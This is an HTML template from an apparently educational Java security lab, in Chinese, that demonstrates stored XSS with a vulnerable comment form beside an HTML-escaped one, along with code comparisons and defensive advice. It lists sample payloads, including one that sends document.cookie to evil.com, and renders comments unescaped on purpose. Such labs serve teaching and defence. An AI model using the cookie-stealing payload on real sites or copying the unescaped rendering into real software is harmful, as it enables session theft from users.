<!DOCTYPE html>
<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>存储型XSS演示 - Java Security Lab</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css" rel="stylesheet">
    <style>
        .vulnerability-demo { background-color: #fff3cd; border: 1px solid #ffeaa7; }
        .safe-demo { background-color: #d1ecf1; border: 1px solid #bee5eb; }
        .payload-box { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
        .result-box { min-height: 100px; border: 1px solid #dee2e6; padding: 10px; }
        .comment-item { border-bottom: 1px solid #eee; padding: 10px 0; }
        .comment-content { word-break: break-all; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="/">Java Security Lab</a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="/xss">XSS主页</a>
                <a class="nav-link" href="/">返回首页</a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-12">
                <h1 class="mb-4">存储型XSS (Stored XSS) 演示</h1>
                
                <!-- 说明部分 -->
                <div class="alert alert-info">
                    <h5><i class="fas fa-info-circle"></i> 什么是存储型XSS？</h5>
                    <p>存储型XSS（也称为持久型XSS）是指恶意脚本被永久存储在目标服务器上（如数据库、文件系统等），当其他用户访问包含恶意脚本的页面时，脚本会在用户浏览器中执行。这种攻击影响范围更广，危害更大。</p>
                    <p><strong>攻击流程：</strong> 攻击者提交恶意脚本 → 服务器存储脚本 → 其他用户访问页面 → 脚本在用户浏览器执行</p>
                </div>

                <!-- 常见载荷 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>常见存储型XSS载荷</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6>基础载荷：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>&lt;svg onload=alert('XSS')&gt;</code>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <h6>高级载荷：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>&lt;script&gt;document.location='http://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>&lt;body onload=alert('XSS')&gt;</code>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 漏洞演示 -->
                <div class="row">
                    <div class="col-md-6">
                        <div class="card vulnerability-demo mb-4">
                            <div class="card-header bg-warning">
                                <h5 class="mb-0"><i class="fas fa-exclamation-triangle"></i> 漏洞版本 - 存储型XSS</h5>
                            </div>
                            <div class="card-body">
                                <p class="text-danger"><strong>警告：</strong> 此版本直接存储和显示用户输入，存在XSS漏洞！</p>
                                
                                <form action="/xss/stored/unsafe" method="post">
                                    <div class="mb-3">
                                        <label for="unsafeComment" class="form-label">发表评论：</label>
                                        <textarea class="form-control" id="unsafeComment" name="comment" rows="3" 
                                                placeholder="输入您的评论..."></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-danger">提交评论（漏洞版本）</button>
                                </form>

                                <div class="mt-3">
                                    <h6>快速测试：</h6>
                                    <button class="btn btn-sm btn-outline-danger me-2" 
                                            onclick="document.getElementById('unsafeComment').value='&lt;script&gt;alert(\'存储型XSS攻击成功！\')&lt;/script&gt;'">
                                        基础XSS
                                    </button>
                                    <button class="btn btn-sm btn-outline-danger me-2" 
                                            onclick="document.getElementById('unsafeComment').value='&lt;img src=x onerror=alert(\'图片XSS攻击！\')&gt;'">
                                        图片XSS
                                    </button>
                                    <button class="btn btn-sm btn-outline-danger" 
                                            onclick="document.getElementById('unsafeComment').value='&lt;svg onload=alert(\'SVG XSS攻击！\')&gt;'">
                                        SVG XSS
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-md-6">
                        <div class="card safe-demo mb-4">
                            <div class="card-header bg-info text-white">
                                <h5 class="mb-0"><i class="fas fa-shield-alt"></i> 安全版本 - HTML转义</h5>
                            </div>
                            <div class="card-body">
                                <p class="text-success"><strong>安全：</strong> 此版本对用户输入进行HTML转义，防止XSS攻击！</p>
                                
                                <form action="/xss/stored/safe" method="post">
                                    <div class="mb-3">
                                        <label for="safeComment" class="form-label">发表评论：</label>
                                        <textarea class="form-control" id="safeComment" name="comment" rows="3" 
                                                placeholder="输入您的评论..."></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-success">提交评论（安全版本）</button>
                                </form>

                                <div class="mt-3">
                                    <h6>快速测试：</h6>
                                    <button class="btn btn-sm btn-outline-success me-2" 
                                            onclick="document.getElementById('safeComment').value='&lt;script&gt;alert(\'这不会执行\')&lt;/script&gt;'">
                                        测试转义
                                    </button>
                                    <button class="btn btn-sm btn-outline-success me-2" 
                                            onclick="document.getElementById('safeComment').value='&lt;img src=x onerror=alert(\'安全的\')&gt;'">
                                        测试图片
                                    </button>
                                    <button class="btn btn-sm btn-outline-success" 
                                            onclick="document.getElementById('safeComment').value='正常的评论内容'">
                                        正常评论
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 评论显示区域 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>评论列表</h5>
                        <small class="text-muted">以下显示所有存储的评论（包括漏洞版本和安全版本）</small>
                    </div>
                    <div class="card-body">
                        <div id="commentsContainer">
                            <div th:if="${comments != null and !comments.empty}">
                                <div th:each="comment : ${comments}" class="comment-item">
                                    <div class="d-flex justify-content-between">
                                        <small class="text-muted" th:text="${comment.timestamp}">时间戳</small>
                                        <span class="badge" th:classappend="${comment.safe} ? 'bg-success' : 'bg-danger'" 
                                              th:text="${comment.safe} ? '安全版本' : '漏洞版本'">版本</span>
                                    </div>
                                    <div class="comment-content mt-2">
                                        <!-- 漏洞版本：直接输出HTML -->
                                        <div th:if="${!comment.safe}" th:utext="${comment.content}">漏洞评论内容</div>
                                        <!-- 安全版本：转义HTML -->
                                        <div th:if="${comment.safe}" th:text="${comment.content}">安全评论内容</div>
                                    </div>
                                </div>
                            </div>
                            <div th:if="${comments == null or comments.empty}" class="text-muted text-center py-4">
                                暂无评论，快来发表第一条评论吧！
                            </div>
                        </div>
                        
                        <div class="mt-3">
                            <a href="/xss/stored/clear" class="btn btn-outline-secondary btn-sm">清空所有评论</a>
                        </div>
                    </div>
                </div>

                <!-- 代码对比 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>代码实现对比</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6 class="text-danger">漏洞代码：</h6>
                                <pre><code class="language-java">// 直接存储和输出用户输入
@PostMapping("/stored/unsafe")
public String storedUnsafe(@RequestParam String comment) {
    Comment c = new Comment();
    c.setContent(comment); // 直接存储
    c.setSafe(false);
    commentRepository.save(c);
    return "redirect:/xss/stored";
}

// 模板中直接输出
&lt;div th:utext="${comment.content}"&gt;&lt;/div&gt;</code></pre>
                            </div>
                            <div class="col-md-6">
                                <h6 class="text-success">安全代码：</h6>
                                <pre><code class="language-java">// HTML转义后存储
@PostMapping("/stored/safe")
public String storedSafe(@RequestParam String comment) {
    Comment c = new Comment();
    c.setContent(escapeHtml(comment)); // HTML转义
    c.setSafe(true);
    commentRepository.save(c);
    return "redirect:/xss/stored";
}

// 模板中安全输出
&lt;div th:text="${comment.content}"&gt;&lt;/div&gt;</code></pre>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 防护建议 -->
                <div class="alert alert-success">
                    <h5><i class="fas fa-shield-alt"></i> 存储型XSS防护建议</h5>
                    <ul class="mb-0">
                        <li><strong>输入验证：</strong> 对所有用户输入进行严格验证和过滤</li>
                        <li><strong>输出编码：</strong> 在输出到HTML时进行适当的编码（HTML实体编码）</li>
                        <li><strong>内容安全策略(CSP)：</strong> 实施严格的CSP头部，限制脚本执行</li>
                        <li><strong>HttpOnly Cookie：</strong> 设置HttpOnly标志防止JavaScript访问Cookie</li>
                        <li><strong>定期审计：</strong> 定期检查存储的数据，清理可疑内容</li>
                        <li><strong>最小权限原则：</strong> 限制用户输入的HTML标签和属性</li>
                    </ul>
                </div>

                <!-- 学习提示 -->
                <div class="alert alert-warning">
                    <h5><i class="fas fa-lightbulb"></i> 学习提示</h5>
                    <p><strong>存储型XSS vs 反射型XSS：</strong></p>
                    <ul class="mb-0">
                        <li><strong>存储型：</strong> 恶意脚本存储在服务器，影响所有访问用户，危害更大</li>
                        <li><strong>反射型：</strong> 恶意脚本在请求中，只影响当前用户，需要诱导点击</li>
                        <li><strong>检测方法：</strong> 尝试提交包含脚本的内容，观察是否被存储和执行</li>
                        <li><strong>影响范围：</strong> 存储型XSS可能影响网站的所有用户，风险更高</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
</body>
</html>